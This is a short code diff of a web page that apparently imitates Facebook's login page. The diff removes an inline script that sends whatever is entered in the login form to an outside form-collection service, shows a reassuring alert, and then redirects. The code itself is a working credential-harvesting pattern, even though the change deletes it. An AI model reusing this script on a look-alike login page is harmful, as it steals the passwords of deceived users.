@@ -194,37 +194,5 @@
         <p>Facebook © 2024</p>
     </footer>
 
-    <!-- Internal JavaScript -->
-    <script>
-        document.getElementById('login-form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission behavior
-
-            // Collect the form data
-            const formData = new FormData(this);
-
-            // Submit the form data via JavaScript to Formspark
-            fetch('https://submit.formspark.io/dmQeERDSQ', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Show the alert after successful submission
-                    alert('We will contact you shortly');
-                    
-                    // Redirect to another page after 3 seconds
-                    setTimeout(function() {
-                        window.location.href = 'home.html'; // Adjust 'home.html' to the correct page
-                    }, 3000);
-                } else {
-                    alert('Error: Unable to submit the form. Please try again.');
-                }
-            })
-            .catch(error => {
-                alert('Submission failed due to network error.');
-                console.error('Form submission error:', error);
-            });
-        });
-    </script>
 </body>
 </html>
